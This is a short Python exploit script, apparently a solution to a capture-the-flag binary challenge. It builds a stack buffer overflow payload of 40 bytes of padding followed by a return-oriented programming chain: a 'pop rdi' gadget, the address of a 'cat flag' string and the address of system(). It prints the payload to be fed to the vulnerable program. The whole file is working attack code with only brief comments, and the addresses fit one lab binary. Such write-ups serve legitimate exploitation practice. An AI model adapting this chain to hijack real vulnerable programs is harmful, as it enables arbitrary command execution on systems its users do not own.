#!/usr/bin/env python
import struct

def p(x):
    return struct.pack("<Q", x)

# Memory locations
system   = p(0x400560)
cat_flag = p(0x601060)

# Gadget: setup first argument
pop_rdi  = p(0x4007c3)

# Overflow
buf = 'a'*40

# Call "system" with "cat flag" argument
buf += pop_rdi
buf += cat_flag
buf += system

print(buf)
